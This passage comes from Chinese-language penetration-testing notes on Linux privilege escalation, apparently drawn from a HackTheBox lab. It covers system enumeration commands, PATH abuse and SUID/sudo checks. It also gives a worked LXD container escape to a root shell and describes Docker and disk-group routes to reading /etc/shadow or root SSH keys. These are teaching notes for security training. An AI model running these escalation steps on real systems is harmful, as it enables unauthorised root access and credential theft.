UP group default qlen 1000</span><br><span class="line">    link/ether 00:50:56:b9:ed:2a brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 10.129.203.168/16 brd 10.129.255.255 scope global dynamic ens192</span><br><span class="line">       valid_lft 3092sec preferred_lft 3092sec</span><br><span class="line">    inet6 dead:beef::250:56ff:feb9:ed2a/64 scope global dynamic mngtmpaddr </span><br><span class="line">       valid_lft 86400sec preferred_lft 14400sec</span><br><span class="line">    inet6 fe80::250:56ff:feb9:ed2a/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>

<p>或</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br><span class="line"># or</span><br><span class="line">hostname -I</span><br></pre></td></tr></table></figure>

<h2 id="etc-hosts"><a href="#etc-hosts" class="headerlink" title="&#x2F;etc&#x2F;hosts"></a>&#x2F;etc&#x2F;hosts</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/hosts</span><br><span class="line"></span><br><span class="line">127.0.0.1 localhost</span><br><span class="line">127.0.1.1 nixlpe02</span><br><span class="line"># The following lines are desirable for IPv6 capable hosts</span><br><span class="line">::1     ip6-localhost ip6-loopback</span><br><span class="line">fe00::0 ip6-localnet</span><br><span class="line">ff00::0 ip6-mcastprefix</span><br><span class="line">ff02::1 ip6-allnodes</span><br><span class="line">ff02::2 ip6-allrouters</span><br></pre></td></tr></table></figure>

<h2 id="Last-login"><a href="#Last-login" class="headerlink" title="Last login"></a>Last login</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ lastlog</span><br><span class="line"></span><br><span class="line">Username         Port     From             Latest</span><br><span class="line">root                                       **Never logged in**</span><br><span class="line">daemon                                     **Never logged in**</span><br><span class="line">bin                                        **Never logged in**</span><br><span class="line">sys                                        **Never logged in**</span><br><span class="line">sync                                       **Never logged in**</span><br><span class="line">...SNIP...</span><br><span class="line">systemd-coredump                           **Never logged in**</span><br><span class="line">mrb3n            pts/1    10.10.14.15      Tue Aug  2 19:33:16 +0000 2022</span><br><span class="line">lxd                                        **Never logged in**</span><br><span class="line">bjones                                     **Never logged in**</span><br><span class="line">administrator.ilfreight                           **Never logged in**</span><br><span class="line">backupsvc                                  **Never logged in**</span><br><span class="line">cliff.moore      pts/0    127.0.0.1        Tue Aug  2 19:32:29 +0000 2022</span><br><span class="line">logger                                     **Never logged in**</span><br><span class="line">shared                                     **Never logged in**</span><br><span class="line">stacey.jenkins   pts/0    10.10.14.15      Tue Aug  2 18:29:15 +0000 2022</span><br><span class="line">htb-student      pts/0    10.10.14.15      Wed Aug  3 13:37:22 +0000 2022        </span><br></pre></td></tr></table></figure>

<h2 id="已登陆的用户"><a href="#已登陆的用户" class="headerlink" title="已登陆的用户"></a>已登陆的用户</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ w</span><br><span class="line"></span><br><span class="line"> 12:27:21 up 1 day, 16:55,  1 user,  load average: 0.00, 0.00, 0.00</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">cliff.mo pts/0    10.10.14.16      Tue19   40:54m  0.02s  0.02s -bash</span><br></pre></td></tr></table></figure>

<p>或</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">who</span><br><span class="line">finger</span><br></pre></td></tr></table></figure>

<h2 id="Bash-history"><a href="#Bash-history" class="headerlink" title="Bash history"></a>Bash history</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ history</span><br><span class="line"></span><br><span class="line">    1  id</span><br><span class="line">    2  cd /home/cliff.moore</span><br><span class="line">    3  exit</span><br><span class="line">    4  touch backup.sh</span><br><span class="line">    5  tail /var/log/apache2/error.log</span><br><span class="line">    6  ssh ec2-user@dmz02.inlanefreight.local</span><br><span class="line">    7  history</span><br></pre></td></tr></table></figure>

<p>查找</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ find / -type f \( -name *_hist -o -name *_history \) -exec ls -l &#123;&#125; \; 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">-rw------- 1 htb-student htb-student 387 Nov 27 14:02 /home/htb-student/.bash_history</span><br></pre></td></tr></table></figure>

<h2 id="Cron-jobs"><a href="#Cron-jobs" class="headerlink" title="Cron jobs"></a>Cron jobs</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ ls -la /etc/cron.daily/</span><br><span class="line"></span><br><span class="line">total 48</span><br><span class="line">drwxr-xr-x  2 root root 4096 Aug  2 17:36 .</span><br><span class="line">drwxr-xr-x 96 root root 4096 Aug  2 19:34 ..</span><br><span class="line">-rwxr-xr-x  1 root root  376 Dec  4  2019 apport</span><br><span class="line">-rwxr-xr-x  1 root root 1478 Apr  9  2020 apt-compat</span><br><span class="line">-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils</span><br><span class="line">-rwxr-xr-x  1 root root 1187 Sep  5  2019 dpkg</span><br><span class="line">-rwxr-xr-x  1 root root  377 Jan 21  2019 logrotate</span><br><span class="line">-rwxr-xr-x  1 root root 1123 Feb 25  2020 man-db</span><br><span class="line">-rw-r--r--  1 root root  102 Feb 13  2020 .placeholder</span><br><span class="line">-rwxr-xr-x  1 root root 4574 Jul 18  2019 popularity-contest</span><br><span class="line">-rwxr-xr-x  1 root root  214 Apr  2  2020 update-notifier-common</span><br></pre></td></tr></table></figure>

<h2 id="Proc"><a href="#Proc" class="headerlink" title="Proc"></a>Proc</h2><p><a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man5/proc.5.html">proc 文件系统</a>( <code>proc</code> &#x2F; <code>procfs</code>)是 Linux 中的一个特殊文件系统，其中包含有关系统进程、硬件和其他系统信息的信息。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ find /proc -name cmdline -exec cat &#123;&#125; \; 2&gt;/dev/null | tr &quot; &quot; &quot;\n&quot;</span><br><span class="line"></span><br><span class="line">...SNIP...</span><br><span class="line">startups/usr/lib/packagekit/packagekitd/usr/lib/packagekit/packagekitd/usr/lib/packagekit/packagekitd/usr/lib/packagekit/packagekitdroot@10.129.14.200sshroot@10.129.14.200sshd:</span><br><span class="line">htb-student</span><br><span class="line">[priv]sshd:</span><br><span class="line">htb-student</span><br><span class="line">[priv]/usr/bin/ssh-agent-D-a/run/user/1000/keyring/.ssh/usr/bin/ssh-agent-D-a/run/user/1000/keyring/.sshsshd:</span><br><span class="line">htb-student@pts/2sshd:</span><br></pre></td></tr></table></figure>

<h2 id="已安装的包"><a href="#已安装的包" class="headerlink" title="已安装的包"></a>已安装的包</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ apt list --installed | tr &quot;/&quot; &quot; &quot; | cut -d&quot; &quot; -f1,3 | sed &#x27;s/[0-9]://g&#x27; | tee -a installed_pkgs.list</span><br><span class="line"></span><br><span class="line">Listing...                                                 </span><br><span class="line">accountsservice-ubuntu-schemas 0.0.7+17.10.20170922-0ubuntu1                   </span><br><span class="line">accountsservice 0.6.55-0ubuntu12~20.04.5                   </span><br><span class="line">acl 2.2.53-6                                               </span><br><span class="line">acpi-support 0.143                                         </span><br><span class="line">acpid 2.0.32-1ubuntu1</span><br><span class="line">...SNIP...</span><br></pre></td></tr></table></figure>

<h2 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -V</span><br><span class="line"></span><br><span class="line">Sudo version 1.8.31</span><br><span class="line">Sudoers policy plugin version 1.8.31</span><br><span class="line">Sudoers file grammar version 46</span><br><span class="line">Sudoers I/O plugin version 1.8.31</span><br></pre></td></tr></table></figure>

<h2 id="二进制文件"><a href="#二进制文件" class="headerlink" title="二进制文件"></a>二进制文件</h2><p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFObins</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$ ls -l /bin /usr/bin/ /usr/sbin/</span><br><span class="line"></span><br><span class="line">lrwxrwxrwx 1 root root     7 Oct 27 11:14 /bin -&gt; usr/bin</span><br><span class="line"></span><br><span class="line">/usr/bin/:</span><br><span class="line">total 175160</span><br><span class="line">-rwxr-xr-x 1 root root       31248 May 19  2020  aa-enabled</span><br><span class="line">-rwxr-xr-x 1 root root       35344 May 19  2020  aa-exec</span><br><span class="line">-rwxr-xr-x 1 root root       22912 Apr 14  2021  aconnect</span><br><span class="line">-rwxr-xr-x 1 root root       19016 Nov 28  2019  acpi_listen</span><br><span class="line">-rwxr-xr-x 1 root root        7415 Oct 26  2021  add-apt-repository</span><br><span class="line">-rwxr-xr-x 1 root root       30952 Feb  7  2022  addpart</span><br><span class="line">lrwxrwxrwx 1 root root          26 Oct 20  2021  addr2line -&gt; x86_64-linux-gnu-addr2line</span><br><span class="line">...SNIP...</span><br><span class="line"></span><br><span class="line">/usr/sbin/:</span><br><span class="line">total 32500</span><br><span class="line">-rwxr-xr-x 1 root root      3068 Mai 19  2020 aa-remove-unknown</span><br><span class="line">-rwxr-xr-x 1 root root      8839 Mai 19  2020 aa-status</span><br><span class="line">-rwxr-xr-x 1 root root       139 Jun 18  2019 aa-teardown</span><br><span class="line">-rwxr-xr-x 1 root root     14728 Feb 25  2020 accessdb</span><br><span class="line">-rwxr-xr-x 1 root root     60432 Nov 28  2019 acpid</span><br><span class="line">-rwxr-xr-x 1 root root      3075 Jul  4 18:20 addgnupghome</span><br><span class="line">lrwxrwxrwx 1 root root         7 Okt 27 11:14 addgroup -&gt; adduser</span><br><span class="line">-rwxr-xr-x 1 root root       860 Dez  7  2019 add-shell</span><br><span class="line">-rwxr-xr-x 1 root root     37785 Apr 16  2020 adduser</span><br><span class="line">-rwxr-xr-x 1 root root     69000 Feb  7  2022 agetty</span><br><span class="line">-rwxr-xr-x 1 root root      5576 Jul 31  2015 alsa</span><br><span class="line">-rwxr-xr-x 1 root root      4136 Apr 14  2021 alsabat-test</span><br><span class="line">-rwxr-xr-x 1 root root    118176 Apr 14  2021 alsactl</span><br><span class="line">-rwxr-xr-x 1 root root     26489 Apr 14  2021 alsa-info</span><br><span class="line">-rwxr-xr-x 1 root root     39088 Jul 16  2019 anacron</span><br><span class="line">...SNIP...</span><br></pre></td></tr></table></figure>

<h2 id="跟踪系统调用"><a href="#跟踪系统调用" class="headerlink" title="跟踪系统调用"></a>跟踪系统调用</h2><p>诊断工具<code>strace</code>可以用来跟踪和分析系统调用和信号处理。还可以使用该工具监视与安全相关的活动并识别潜在的攻击媒介，例如使用密码或令牌向远程主机发出的特定请求。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">$ strace ping -c1 10.129.112.20</span><br><span class="line"></span><br><span class="line">execve(&quot;/usr/bin/ping&quot;, [&quot;ping&quot;, &quot;-c1&quot;, &quot;10.129.112.20&quot;], 0x7ffdc8b96cc0 /* 80 vars */) = 0</span><br><span class="line">access(&quot;/etc/suid-debug&quot;, F_OK)         = -1 ENOENT (No such file or directory)</span><br><span class="line">brk(NULL)                               = 0x56222584c000</span><br><span class="line">arch_prctl(0x3001 /* ARCH_??? */, 0x7fffb0b2ea00) = -1 EINVAL (Invalid argument)</span><br><span class="line">...SNIP...</span><br><span class="line">access(&quot;/etc/ld.so.preload&quot;, R_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">...SNIP...</span><br><span class="line">openat(AT_FDCWD, &quot;/lib/x86_64-linux-gnu/libidn2.so.0&quot;, O_RDONLY|O_CLOEXEC) = 3</span><br><span class="line">...SNIP...</span><br><span class="line">read(3, &quot;\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0&gt;\0\1\0\0\0P\237\2\0\0\0\0\0&quot;..., 832) = 832</span><br><span class="line">pread64(3, &quot;\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0&quot;..., 784, 64) = 784</span><br><span class="line">pread64(3, &quot;\4\0\0\0 \0\0\0\5\0\0\0GNU\0\2\0\0\300\4\0\0\0\3\0\0\0\0\0\0\0&quot;..., 48, 848) = 48</span><br><span class="line">...SNIP...</span><br><span class="line">socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP) = 3</span><br><span class="line">socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6) = 4</span><br><span class="line">capget(&#123;version=_LINUX_CAPABILITY_VERSION_3, pid=0&#125;, NULL) = 0</span><br><span class="line">capget(&#123;version=_LINUX_CAPABILITY_VERSION_3, pid=0&#125;, &#123;effective=0, permitted=0, inheritable=0&#125;) = 0</span><br><span class="line">openat(AT_FDCWD, &quot;/usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache&quot;, O_RDONLY) = 5</span><br><span class="line">...SNIP...</span><br><span class="line">socket(AF_INET, SOCK_DGRAM, IPPROTO_IP) = 5</span><br><span class="line">connect(5, &#123;sa_family=AF_INET, sin_port=htons(1025), sin_addr=inet_addr(&quot;10.129.112.20&quot;)&#125;, 16) = 0</span><br><span class="line">getsockname(5, &#123;sa_family=AF_INET, sin_port=htons(39885), sin_addr=inet_addr(&quot;10.129.112.20&quot;)&#125;, [16]) = 0</span><br><span class="line">close(5)                                = 0</span><br><span class="line">...SNIP...</span><br><span class="line">sendto(3, &quot;\10\0\31\303\0\0\0\1eX\327c\0\0\0\0\330\254\n\0\0\0\0\0\20\21\22\23\24\25\26\27&quot;..., 64, 0, &#123;sa_family=AF_INET, sin_port=htons(0), sin_addr=inet_addr(&quot;10.129.112.20&quot;)&#125;, 16) = 64</span><br><span class="line">...SNIP...</span><br><span class="line">recvmsg(3, &#123;msg_name=&#123;sa_family=AF_INET, sin_port=htons(0), sin_addr=inet_addr(&quot;10.129.112.20&quot;)&#125;, msg_namelen=128 =&gt; 16, msg_iov=[&#123;iov_base=&quot;\0\0!\300\0\3\0\1eX\327c\0\0\0\0\330\254\n\0\0\0\0\0\20\21\22\23\24\25\26\27&quot;..., iov_len=192&#125;], msg_iovlen=1, msg_control=[&#123;cmsg_len=32, cmsg_level=SOL_SOCKET, cmsg_type=SO_TIMESTAMP_OLD, cmsg_data=&#123;tv_sec=1675057253, tv_usec=699895&#125;&#125;, &#123;cmsg_len=20, cmsg_level=SOL_IP, cmsg_type=IP_TTL, cmsg_data=[64]&#125;], msg_controllen=56, msg_flags=0&#125;, 0) = 64</span><br><span class="line">write(1, &quot;64 bytes from 10.129.112.20: icmp_se&quot;..., 57) = 57</span><br><span class="line">write(1, &quot;\n&quot;, 1)                       = 1</span><br><span class="line">write(1, &quot;--- 10.129.112.20 ping statistics --&quot;..., 34) = 34</span><br><span class="line">write(1, &quot;1 packets transmitted, 1 receive&quot;..., 60) = 60</span><br><span class="line">write(1, &quot;rtt min/avg/max/mdev = 0.287/0.2&quot;..., 50) = 50</span><br><span class="line">close(1)                                = 0</span><br><span class="line">close(2)                                = 0</span><br><span class="line">exit_group(0)                           = ?</span><br><span class="line">+++ exited with 0 +++</span><br></pre></td></tr></table></figure>

<h2 id="查找文件"><a href="#查找文件" class="headerlink" title="查找文件"></a>查找文件</h2><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ find / -type f \( -name *.conf -o -name *.config \) -exec ls -l &#123;&#125; \; 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">-rw-r--r-- 1 root root 448 Nov 28 12:31 /run/tmpfiles.d/static-nodes.conf</span><br><span class="line">-rw-r--r-- 1 root root 71 Nov 28 12:31 /run/NetworkManager/resolv.conf</span><br><span class="line">-rw-r--r-- 1 root root 72 Nov 28 12:31 /run/NetworkManager/no-stub-resolv.conf</span><br><span class="line">-rw-r--r-- 1 root root 0 Nov 28 12:37 /run/NetworkManager/conf.d/10-globally-managed-devices.conf</span><br><span class="line">-rw-r--r-- 1 systemd-resolve systemd-resolve 736 Nov 28 12:31 /run/systemd/resolve/stub-resolv.conf</span><br><span class="line">-rw-r--r-- 1 systemd-resolve systemd-resolve 607 Nov 28 12:31 /run/systemd/resolve/resolv.conf</span><br><span class="line">...SNIP...</span><br></pre></td></tr></table></figure>

<h3 id="脚本文件"><a href="#脚本文件" class="headerlink" title="脚本文件"></a>脚本文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ find / -type f -name &quot;*.sh&quot; 2&gt;/dev/null | grep -v &quot;src\|snap\|share&quot;</span><br><span class="line"></span><br><span class="line">/home/htb-student/automation.sh</span><br><span class="line">/etc/wpa_supplicant/action_wpa.sh</span><br><span class="line">/etc/wpa_supplicant/ifupdown.sh</span><br><span class="line">/etc/wpa_supplicant/functions.sh</span><br><span class="line">/etc/init.d/keyboard-setup.sh</span><br><span class="line">/etc/init.d/console-setup.sh</span><br><span class="line">/etc/init.d/hwclock.sh</span><br><span class="line">...SNIP...</span><br></pre></td></tr></table></figure>

<h1 id="PATH-Abuse"><a href="#PATH-Abuse" class="headerlink" title="PATH Abuse"></a>PATH Abuse</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ PATH=.:$&#123;PATH&#125;</span><br><span class="line">$ export PATH</span><br><span class="line">$ echo $PATH</span><br><span class="line"></span><br><span class="line">.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games</span><br></pre></td></tr></table></figure>

<h1 id="Special-Permissions"><a href="#Special-Permissions" class="headerlink" title="Special Permissions"></a>Special Permissions</h1><p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFOBins</a></p>
<h2 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$ find / -perm -4000 -exec ls -ldb &#123;&#125; \; 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">-rwsr-xr-x 1 root root 16728 Sep  1 19:06 /home/htb-student/shared_obj_hijack/payroll</span><br><span class="line">-rwsr-xr-x 1 root root 16728 Sep  1 22:05 /home/mrb3n/payroll</span><br><span class="line">-rwSr--r-- 1 root root 0 Aug 31 02:51 /home/cliff.moore/netracer</span><br><span class="line">-rwsr-xr-x 1 root root 40152 Nov 30  2017 /bin/mount</span><br><span class="line">-rwsr-xr-x 1 root root 40128 May 17  2017 /bin/su</span><br><span class="line">-rwsr-xr-x 1 root root 27608 Nov 30  2017 /bin/umount</span><br><span class="line">-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6</span><br><span class="line">-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount</span><br><span class="line">-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping</span><br><span class="line">-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g</span><br><span class="line">-rwsr-xr-x 1 root root 38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic</span><br><span class="line">-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">-rwsr-xr-x 1 root root 14864 Jan 18  2016 /usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">-rwsr-sr-x 1 root root 85832 Nov 30  2017 /usr/lib/snapd/snap-confine</span><br><span class="line">-rwsr-xr-x 1 root root 428240 Jan 18  2018 /usr/lib/openssh/ssh-keysign</span><br><span class="line">-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device</span><br><span class="line">-rwsr-xr-x 1 root root 23376 Jan 18  2016 /usr/bin/pkexec</span><br><span class="line">-rwsr-sr-x 1 root root 240 Feb  1  2016 /usr/bin/facter</span><br><span class="line">-rwsr-xr-x 1 root root 39904 May 17  2017 /usr/bin/newgrp</span><br><span class="line">-rwsr-xr-x 1 root root 32944 May 17  2017 /usr/bin/newuidmap</span><br><span class="line">-rwsr-xr-x 1 root root 49584 May 17  2017 /usr/bin/chfn</span><br><span class="line">-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo</span><br><span class="line">-rwsr-xr-x 1 root root 40432 May 17  2017 /usr/bin/chsh</span><br><span class="line">-rwsr-xr-x 1 root root 32944 May 17  2017 /usr/bin/newgidmap</span><br><span class="line">-rwsr-xr-x 1 root root 75304 May 17  2017 /usr/bin/gpasswd</span><br><span class="line">-rwsr-xr-x 1 root root 54256 May 17  2017 /usr/bin/passwd</span><br><span class="line">-rwsr-xr-x 1 root root 10624 May  9  2018 /usr/bin/vmware-user-suid-wrapper</span><br><span class="line">-rwsr-xr-x 1 root root 1588768 Aug 31 00:50 /usr/bin/screen-4.5.0</span><br><span class="line">-rwsr-xr-x 1 root root 94240 Jun  9 14:54 /sbin/mount.nfs</span><br></pre></td></tr></table></figure>

<h2 id="SGID"><a href="#SGID" class="headerlink" title="SGID"></a>SGID</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ find / -perm -6000 -exec ls -ldb &#123;&#125; \; 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">-rwsr-sr-x 1 root root 85832 Nov 30  2017 /usr/lib/snapd/snap-confine</span><br></pre></td></tr></table></figure>

<h1 id="Sudo-Abuse"><a href="#Sudo-Abuse" class="headerlink" title="Sudo Abuse"></a>Sudo Abuse</h1><p>可以向某个帐户授予 sudo 权限，允许该帐户在 root（或另一个帐户）的上下文中运行某些命令，而无需更改用户或授予过多权限。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -l</span><br><span class="line"></span><br><span class="line">Matching Defaults entries for sysadm on NIX02:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User sysadm may run the following commands on NIX02:</span><br><span class="line">    (ALL : ALL) ALL</span><br></pre></td></tr></table></figure>

<h1 id="Privileged-Groups"><a href="#Privileged-Groups" class="headerlink" title="Privileged Groups"></a>Privileged Groups</h1><h2 id="LXC-LXD"><a href="#LXC-LXD" class="headerlink" title="LXC &#x2F; LXD"></a>LXC &#x2F; LXD</h2><p>LXD 类似于 Docker，是 Ubuntu 的容器管理器。安装后，所有用户都会添加到 LXD 组。该组的成员身份可用于通过创建 LXD 容器、使其具有特权，然后访问主机文件系统来提升权限<code>/mnt/root</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">lxd init</span><br><span class="line">lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine</span><br><span class="line">lxc init alpine r00t -c security.privileged=true</span><br><span class="line">lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true</span><br><span class="line">lxc start r00t</span><br><span class="line"></span><br><span class="line">$ lxc exec r00t /bin/sh</span><br><span class="line">~ # id</span><br><span class="line">uid=0(root) gid=0(root)</span><br><span class="line">~ # </span><br></pre></td></tr></table></figure>

<h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><p>将用户放入 docker 组本质上相当于无需密码即可获得文件系统的 root 级别访问权限。docker 组的成员可以创建新的 docker 容器。一个例子是运行命令<code>docker run -v /root:/mnt -it ubuntu</code>。此命令创建一个新的 Docker 实例，并将主机文件系统上的 &#x2F;root 目录作为卷挂载。启动容器后，就可以浏览到挂载的目录并为 root 用户检索或添加 SSH 密钥。这可以用于其他目录，例如<code>/etc</code>可用于检索文件内容<code>/etc/shadow</code>以进行离线密码破解或添加特权用户的目录。</p>
<h2 id="Disk"><a href="#Disk" class="headerlink" title="Disk"></a>Disk</h2><p>磁盘组中的用户对 中包含的任何设备<code>/dev</code>（例如<code>/dev/sda1</code>）具有完全访问权限，这通常是操作系统使用的主要设备。具有这些权限的攻击者可以使用<code>debugfs</code>以root 级权限访问整个文件系统。</p>
